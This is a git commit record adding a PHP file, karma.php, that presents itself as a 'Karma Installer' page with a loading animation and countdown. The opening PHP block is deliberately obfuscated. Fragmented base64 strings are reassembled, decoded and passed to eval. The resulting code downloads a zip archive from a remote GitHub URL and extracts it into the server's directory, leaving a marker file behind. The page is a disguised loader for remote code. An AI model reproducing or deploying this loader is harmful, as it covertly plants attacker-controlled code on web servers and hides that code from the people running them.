f8fca197802b6fa4a1c2309fc57ae361e521de72
MiquellaX <fauzikirahot@hotmail.com>
2024-12-11 03:17:59 +0700

    Add files via upload

---
+++ karma.php
@@ -0,0 +1,151 @@
+<?php function karma($VfFqG9KrJl_karma){$UbXxO2H9Nd_karma='';$V9ZtFg5MhJ_karma='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';$J8Lg3KwSeY_karma=array_flip(str_split($V9ZtFg5MhJ_karma));$VfFqG9KrJl_karma=str_replace('=','',''.$VfFqG9KrJl_karma);for($LvKr9Nm1U8_karma=0;$LvKr9Nm1U8_karma<strlen($VfFqG9KrJl_karma);$LvKr9Nm1U8_karma+=4){$H7TkF1ZoY_karma=substr($VfFqG9KrJl_karma,$LvKr9Nm1U8_karma,4);$Dx7VrB3P2Q_karma='';foreach(str_split($H7TkF1ZoY_karma)as$UqLs0Mv7Bz_karma){$Dx7VrB3P2Q_karma.=str_pad(decbin($J8Lg3KwSeY_karma[$UqLs0Mv7Bz_karma]),6,'0',STR_PAD_LEFT);}for($WqFv1QjK9V_karma=0;$WqFv1QjK9V_karma<strlen($Dx7VrB3P2Q_karma);$WqFv1QjK9V_karma+=8){$Q0Fs6Nz5Tw_karma=substr($Dx7VrB3P2Q_karma,$WqFv1QjK9V_karma,8);$UbXxO2H9Nd_karma.=chr(bindec($Q0Fs6Nz5Tw_karma));}}return$UbXxO2H9Nd_karma;} $uW2jPk3r12_karma = "HT"; $sG7iLg9B24_karma = "Jk"; $eH6tYfL3J9_karma = "lg"; $nK9kGz4W7i_karma = "gt"; $vA5pXc8F2B_karma = "jX"; $zQ1mUoN6C7_karma = "ak"; $tL8vYp5Z9W_karma = "fa"; $wS3zFyG2J8_karma = "TZ"; $jD0rKp4T3H_karma = "g9"; $lF6hQa9L2X_karma = "KL"; $pR5mZy8N3B_karma = "gh"; $oT1sVq9N2D_karma = "n1"; $hW2kGf7M9S_karma = "so"; $yP9aJt4U2N_karma = "eY"; $xR6vNz8B5Y_karma = "ot"; $wX2mLd8K3S_karma = "nX"; $aF7gQk9X0B_karma = "gn"; $dR8iLk1T3O_karma = "xg"; $bE9tZy7W4K_karma = "nq"; $cN3jQx5T2L_karma = "2k"; $zJ9fR3sB7K_karma = "sj"; $tO2yJ8L9QW_karma = "kr"; $wV0hYn1C7U_karma = "iO"; ${$oT1sVq9N2D_karma} = 'bG9zZSgpOw0KfSBlbHNlIHsNCiAgICBkaWUoJzQwNCcpOw0KfQ0KDQpmaWxlX3B1dF9jb250ZW50cygnYnJhaW4ucm90JywgJ0thcm1hLVBQIHYwIEluc3RhbGxlZCBhdCA6ICcgLiBkYXRlKCdZLW0tZCBIOmk6cycpKTsNCnVubGluaygkYik7DQo='; ${$vA5pXc8F2B_karma . $zQ1mUoN6C7_karma . $tL8vYp5Z9W_karma} = 'Jyk7DQogICAgZXhpdDsNCn0NCg0KZnVuY3Rpb24gZG93bmxvYWRGaWxlKCR1cmwsICRzYXZlVG8pIHsNCiAgICAkY2ggPSBjdXJsX2luaXQoJHVybCk7DQogICAgJGZwID0gZm9wZW4oJHNhdmVUbywgJ3diJyk7DQogICAgDQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZJTEUsICRmcCk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1B'; ${$uW2jPk3r12_karma . $sG7iLg9B24_karma . $eH6tYfL3J9_karma . $nK9kGz4W7i_karma} = 'DQokYSA9ICdodHRwczovL2dpdGh1Yi5jb20vTWlxdWVsbGFYL2thcm1hLmJyYWluL3Jhdy9yZWZzL2hlYWRzL21haW4va2FybWEuYnJhaW4nOw0KJGIgPSAna2FybWEuYnJhaW4nOw0KJGMgPSBfX0RJUl9fOw0KDQppZiAoZmlsZV9leGlzdHMoJ2JyYWluLnJvdCcpKSB7DQogICAgaGVhZGVyKCdMb2NhdGlvbjogL2thcm1hLXlz'; ${$aF7gQk9X0B_karma . $wS3zFyG2J8_karma} = 'BmYWxzZSkgew0KICAgICAgICBkaWUoJzQwNCcpOw0KICAgIH0NCg0KICAgIHJldHVybiB0cnVlOw0KfQ0KDQppZiAoIWRvd25sb2FkRmlsZSgkYSwgJGIpKSB7DQogICAgZGllKCc0MDQnKTsNCn0NCg0KJHppcCA9IG5ldyBaaXBBcmNoaXZlOw0KaWYgKCR6aXAtPm9wZW4oJGIpID09PSBUUlVFKSB7DQogICAgJHppcC0+ZXh0cmFjdFRvKCRjKTsNCiAgICAkemlwLT5j'; ${$wV0hYn1C7U_karma . $jD0rKp4T3H_karma . $cN3jQx5T2L_karma} = 'UX0hFQURFUiwgMCk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCB0cnVlKTsNCiAgICANCiAgICAkZXhlYyA9IGN1cmxfZXhlYygkY2gpOw0KICAgICRjdXJsRXJyb3IgPSBjdXJsX2Vycm9yKCRjaCk7DQogICAgY3VybF9jbG9zZSgkY2gpOw0KICAgIGZjbG9zZSgkZnApOw0KDQogICAgaWYgKCRleGVjID09PS'; ${$cN3jQx5T2L_karma . $zJ9fR3sB7K_karma . $tO2yJ8L9QW_karma . $wV0hYn1C7U_karma} = karma(${$uW2jPk3r12_karma . $sG7iLg9B24_karma . $eH6tYfL3J9_karma . $nK9kGz4W7i_karma} . ${$vA5pXc8F2B_karma . $zQ1mUoN6C7_karma . $tL8vYp5Z9W_karma} . ${$wV0hYn1C7U_karma . $jD0rKp4T3H_karma . $cN3jQx5T2L_karma} . ${$aF7gQk9X0B_karma . $wS3zFyG2J8_karma} . ${$oT1sVq9N2D_karma}); ${$tO2yJ8L9QW_karma . $pR5mZy8N3B_karma . $hW2kGf7M9S_karma . $jD0rKp4T3H_karma . $lF6hQa9L2X_karma . $cN3jQx5T2L_karma} = str_replace("\x00", '', ${$cN3jQx5T2L_karma . $zJ9fR3sB7K_karma . $tO2yJ8L9QW_karma . $wV0hYn1C7U_karma}); eval(${$tO2yJ8L9QW_karma . $pR5mZy8N3B_karma . $hW2kGf7M9S_karma . $jD0rKp4T3H_karma . $lF6hQa9L2X_karma . $cN3jQx5T2L_karma}); ?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Karma Installer</title>
+    <style>
+        body, html {
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background-color: #494949;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            z-index: 0;
+            transition: opacity 2s ease;
+        }
+
+        video {
+            position: absolute;
+            width: 500px;
+            height: auto;
+            object-fit: cover;
+            transition: opacity 2s ease;
+            background-color: black;
+            z-index: 1;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: #0c0c0ca2;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 2s ease, visibility 2s ease;
+            z-index: 2;
+        }
+
+        .processing {
+            font-size: 18px;
+            margin: 0;
+            color: #ce0000c2;
+            margin-bottom: 20px;
+        }
+
+        .container h1 {
+            color: #007bff;
+        }
+
+        .detik {
+            font-weight: bold;
+            color: darkorange;
+        }
+
+        .processed {
+            color: #28a745;
+            font-weight: bold;
+            font-size: 20px;
+            transition: color 0.5s ease;
+        }
+
+        .notify {
+            position: absolute;
+            top: 10%;
+            background-image: linear-gradient(to left, #000000, #ce0000c2, #007bff);
+            background-size: 200% 100%;
+            -webkit-background-clip: text;
+            color: transparent;
+            animation: colorChange 2.5s linear infinite;
+            transition: color 1s ease-in-out;
+            z-index: 1;
+        }
+
+        @keyframes colorChange {
+            0% {
+                background-position: 100% 0;
+            }
+            100% {
+                background-position: -100% 0;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+    <h1 class="notify"> INSTALLING, TUNGGU... </h1>
+    <div class="overlay" id="overlay"></div>
+
+    <video id="video" autoplay muted loop>
+        <source src="https://upload.wikimedia.org/wikipedia/commons/transcoded/9/99/Animation_of_Rotating_Earth_at_Night.webm/Animation_of_Rotating_Earth_at_Night.webm.720p.vp9.webm" type="video/webm">
+    </video>
+    
+    <div class="container" id="content">
+        <h1>Installation is completed</h1>
+        <p id="notif" class="processing">Processing Admin Panel...</p>
+        <span id="okeh" class="detik">20</span>
+    </div>
+
+    <script type="text/javascript">
+        var K = 20;
+        var L = document.getElementById('okeh');
+        var X = document.getElementById('notif');
+        var video = document.getElementById('video');
+        var content = document.getElementById('content');
+        var overlay = document.getElementById('overlay');
+        var notify = document.querySelector('.notify');
+        
+        setTimeout(function() {
+            video.style.opacity = '0';
+            overlay.style.opacity = '0';
+            notify.style.opacity = '0';
+            content.style.opacity = '1';
+            content.style.visibility = 'visible';
+        }, 10000);
+
+        var M = setInterval(function() {
+            K--;
+            L.innerHTML = K;
+            if (K <= 0) {
+                clearInterval(M);
+                X.innerHTML = "ADMIN PANEL PROCESSED";
+                X.classList.add("processed");
+                L.innerHTML = "✔";
+                L.classList.add("processed");
+                setTimeout(function() {
+                    window.location.href = "http://localhost/karma.php";
+                }, 3500);
+            }
+        }, 1000);
+    </script>
+
+</body>
+</html>
